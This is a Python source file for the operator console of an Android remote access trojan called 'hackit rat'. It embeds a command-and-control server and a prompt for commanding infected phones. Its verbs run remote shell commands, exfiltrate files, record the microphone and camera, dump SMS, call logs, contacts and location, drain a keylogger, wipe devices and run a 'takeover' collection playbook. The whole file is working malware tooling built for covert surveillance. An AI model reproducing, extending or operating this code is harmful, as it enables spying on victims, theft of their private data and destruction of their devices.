"""Operator console: the C2 runs in-process on a loop thread, the REPL owns stdin.

Sessions, tasks, live event tails and loot are all reachable from one prompt.
Every action goes through the same Hub/queue path a remote operator uses, so
the console and the HTTP API can never drift apart.
"""
from __future__ import annotations

import asyncio
import os
import secrets
import shutil
import threading
import time
from typing import Dict, List, Optional

from hackit.ui import _colored, B_CYAN, B_GREEN, B_WHITE, DIM, GREEN, RED, YELLOW

from . import protocol, store, term
from .server import Hub, make_app

HELP = [
    ("sessions / ls", "list known devices"),
    ("use <n|sid>", "select a device"),
    ("info", "device inventory"),
    ("cmd <verb> [args]", "queue a raw command"),
    ("poll", "show new events and task output for the selected device"),
    ("tail", "follow events until Ctrl-C"),
    ("shell <command>", "run a shell command on the device"),
    ("lock / wipe", "lock the screen / factory reset"),
    ("lsfiles <path>", "list a directory"),
    ("pull <path>", "download a file"),
    ("push <local> <remote>", "upload a file to the device"),
    ("mic [seconds]", "record the microphone"),
    ("cam", "take a photo"),
    ("shot", "screen capture (needs consent)"),
    ("sms [n] / calls / contacts / loc", "dump data"),
    ("keylog", "drain the keylogger buffer"),
    ("takeover", "re-run the full collection playbook"),
    ("sleep <ms>", "set the beacon interval"),
    ("loot", "downloaded artifacts"),
    ("open <token>", "open a looted artifact"),
    ("help / quit", "this list / exit"),
]

BANNER = [
    "hackit rat · operator console",
    "help for verbs · quit to drop",
]


class Console:
    def __init__(self, host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
        self.hub = Hub(psk=psk, token=secrets.token_urlsafe(16), public_url=public_url,
                       udp_port=udp_port)
        self.host = host
        self.port = port
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._serve, name="c2", daemon=True)
        self.sid: Optional[str] = None
        self.seen_events = 0
        self.seen_tasks: Dict[int, str] = {}

    def _serve(self) -> None:
        from aiohttp import web

        asyncio.set_event_loop(self.loop)
        app = make_app(self.hub)

        async def boot() -> None:
            app_runner = web.AppRunner(app, access_log=None)
            await app_runner.setup()
            site = web.TCPSite(app_runner, self.host, self.port)
            await site.start()

        self.loop.create_task(boot())
        self.loop.run_forever()

    def start(self) -> None:
        self.thread.start()
        time.sleep(0.4)

    def call(self, coro, timeout: float = 30.0):
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=timeout)

    # --------------------------------------------------------------- helpers

    def resolve(self, token: str) -> Optional[str]:
        if not token:
            return self.sid
        if token.isdigit():
            rows = store.sessions()
            index = int(token) - 1
            return rows[index]["sid"] if 0 <= index < len(rows) else None
        return token if store.get_session(token) else None

    def require(self) -> Optional[str]:
        sid = self.resolve("")
        if not sid:
            print(_colored("  select a device first: use <n>", YELLOW))
        return sid

    def show_sessions(self) -> None:
        store.mark_offline(self.hub.offline_after)
        rows = store.sessions()
        if not rows:
            print(_colored("  no devices yet — build an apk and install it", DIM))
            return
        width, _ = term.size()
        table = []
        for index, row in enumerate(rows, 1):
            dot = term.Good + "●" + term.RESET if row["online"] else term.Dim + "○" + term.RESET
            mark = term.Accent + "*" + term.RESET if row["sid"] == self.sid else " "
            table.append([
                mark, f"{index:>2}", dot, (row.get("spec") or "rat")[:8],
                (row.get("label") or "?")[:18], (row.get("model") or "?")[:20],
                f"{row.get('battery') or 0}%{'⚡' if row.get('charging') else ''}",
                age(row["last_seen"]),
            ])
        for line in term.table(("", "#", "", "spec", "label", "model", "batt", "last"), table,
                               (1, 3, 1, 8, 18, 20, 6, 5),
                               ("left", "right", "center", "left", "left", "left", "right", "right")):
            print("  " + term.trunc(line, width - 2))

    def poll_once(self) -> None:
        sid = self.require()
        if not sid:
            return
        events = store.events(sid, after_id=self.seen_events, limit=100)
        for event in events:
            self.seen_events = max(self.seen_events, event["id"])
            print(f"  {_colored(age(event['ts']), DIM)} {_colored(event['kind'], B_CYAN)} "
                  f"{compact(event['body'])}")
        if not events:
            print(_colored("  no new events", DIM))
        for task in store.tasks(sid, 20):
            previous = self.seen_tasks.get(task["id"])
            if previous == task["state"] or task["state"] in ("queued", "delivered"):
                continue
            self.seen_tasks[task["id"]] = task["state"]
            color = GREEN if task["state"] == "done" else RED
            print(f"  #{task['id']} {_colored(task['cmd'], B_WHITE)} {_colored(task['state'], color)}")
            if task.get("output"):
                print(indent(task["output"], "    "))

    def queue(self, cmd: str, args: Optional[List[str]] = None) -> None:
        sid = self.require()
        if not sid:
            return
        try:
            task_id = store.queue_task(sid, cmd, args or [])
        except protocol.ProtocolError as exc:
            print(_colored(f"  {exc}", RED))
            return
        self.hub.wake(sid)
        self.seen_tasks[task_id] = "queued"
        print(_colored(f"  queued #{task_id} {cmd} {' '.join(args or [])}", DIM))

    def print_loot(self) -> None:
        sid = self.require()
        if not sid:
            return
        rows = store.loot(sid)
        if not rows:
            print(_colored("  no artifacts", DIM))
            return
        for row in rows:
            token = os.path.basename(row["path"]).split("-")[0]
            print(f"  {row['id']:>3} {row['name']:<40} {row['size']:>10,}  {row['kind']:<6} {token}")

    def open_loot(self, token: str) -> None:
        sid = self.require()
        if not sid or not token:
            return
        folder = os.path.join(store.FILES_DIR, sid)
        if not os.path.isdir(folder):
            return
        for entry in sorted(os.listdir(folder)):
            if entry.startswith(token):
                path = os.path.join(folder, entry)
                opener = shutil.which("xdg-open") or shutil.which("open")
                if not opener:
                    print(_colored(f"  {path}", DIM))
                    return
                os.spawnlp(os.P_NOWAIT, opener, opener, path)
                print(_colored(f"  opened {path}", DIM))
                return
        print(_colored("  token not found", RED))


def age(ts: float) -> str:
    delta = max(0, int(time.time() - ts))
    if delta < 60:
        return f"{delta}s"
    if delta < 3600:
        return f"{delta // 60}m"
    if delta < 86400:
        return f"{delta // 3600}h"
    return f"{delta // 86400}d"


def compact(body: str, limit: int = 500) -> str:
    text = body if len(body) <= limit else body[: limit] + "…"
    return text.replace("\n", " ")


def indent(text: str, prefix: str) -> str:
    return "\n".join(prefix + line for line in text.splitlines()[:200])


def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
    store.init()
    terminal = Console(host, port, psk, public_url, udp_port)
    terminal.start()
    for line in term.box("OPERATOR CONSOLE", BANNER, 52, term.Frame):
        print("  " + line)
    print("  " + term.label("listen", 10) + term.Bright + f"{host}:{port}" + term.RESET)
    print("  " + term.label("token", 10) + term.Dim + terminal.hub.token + term.RESET)
    print("  " + term.label("host", 10) + term.Dim + public_url + term.RESET)
    print()

    while True:
        try:
            line = input(_colored("rat> ", B_GREEN)).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            terminal.poll_once()
            continue
        verb, _, rest = line.partition(" ")
        verb = verb.lower()
        args = rest.split()

        try:
            if verb in ("quit", "exit", "q"):
                break
            elif verb in ("help", "?"):
                for name, desc in HELP:
                    print("  " + term.pad(term.Bright + name + term.RESET, 34) + term.Dim + desc + term.RESET)
            elif verb in ("sessions", "ls"):
                terminal.show_sessions()
            elif verb == "use":
                sid = terminal.resolve(args[0] if args else "")
                if sid:
                    terminal.sid = sid
                    terminal.seen_events = 0
                    print(_colored(f"  using {sid}", GREEN))
                else:
                    print(_colored("  no such device", RED))
            elif verb == "info":
                terminal.queue("info")
            elif verb == "cmd":
                if args:
                    terminal.queue(args[0], args[1:])
                else:
                    print(_colored("  usage: cmd <verb> [args]", DIM))
            elif verb == "poll":
                terminal.poll_once()
            elif verb == "tail":
                try:
                    while True:
                        terminal.poll_once()
                        time.sleep(3)
                except KeyboardInterrupt:
                    print()
            elif verb == "shell":
                terminal.queue("shell", [" ".join(args)])
            elif verb == "lsfiles":
                terminal.queue("files_ls", [" ".join(args) or "."])
            elif verb == "pull":
                terminal.queue("files_pull", [" ".join(args)])
            elif verb == "push":
                if len(args) < 2:
                    print(_colored("  usage: push <local> <remote>", DIM))
                else:
                    token = console_upload(terminal, args[0], args[1])
                    if token:
                        terminal.queue("files_push", [args[1], token])
            elif verb == "mic":
                terminal.queue("mic_rec", [args[0] if args else "15"])
            elif verb == "cam":
                terminal.queue("cam_shot")
            elif verb == "shot":
                terminal.queue("screenshot")
            elif verb == "sms":
                terminal.queue("sms_dump", [args[0] if args else "200"])
            elif verb == "calls":
                terminal.queue("calls_dump", [args[0] if args else "200"])
            elif verb == "contacts":
                terminal.queue("contacts_dump", [args[0] if args else "1000"])
            elif verb == "apps":
                terminal.queue("apps")
            elif verb == "loc":
                terminal.queue("loc")
            elif verb == "keylog":
                terminal.queue("keylog_dump")
            elif verb == "sleep":
                sid = terminal.require()
                if sid and args:
                    store.touch(sid, sleep_ms=int(args[0]))
                    terminal.hub.wake(sid)
                    print(_colored(f"  sleep {args[0]} ms", DIM))
            elif verb in ("lock", "wipe"):
                terminal.queue(verb)
            elif verb == "takeover":
                sid = terminal.require()
                if sid:
                    store.release_takeover(sid)
                    from . import server as c2

                    queued = c2.auto_takeover(terminal.hub, sid)
                    terminal.hub.wake(sid)
                    print(_colored(f"  takeover re-queued ({queued} steps)", GREEN))
            elif verb == "loot":
                terminal.print_loot()
            elif verb == "open":
                terminal.open_loot(args[0] if args else "")
            else:
                print(_colored(f"  unknown verb {verb!r} — help", YELLOW))
        except Exception as exc:  # keep the REPL alive on any handler slip
            print(_colored(f"  error: {exc}", RED))

    print(_colored("  bye.", DIM))


def console_upload(terminal: Console, local: str, remote: str) -> Optional[str]:
    """Stage a local file in the loot folder so the device can pull it."""
    if not os.path.isfile(local):
        print(_colored(f"  not a file: {local}", RED))
        return None
    sid = terminal.require()
    if not sid:
        return None
    folder = os.path.join(store.FILES_DIR, sid)
    os.makedirs(folder, exist_ok=True)
    token = secrets.token_hex(8)
    target = os.path.join(folder, f"{token}-{os.path.basename(local)}")
    shutil.copy2(local, target)
    store.add_loot(sid, os.path.basename(local), target, os.path.getsize(target), "push")
    print(_colored(f"  staged {target} for {remote}", DIM))
    return token


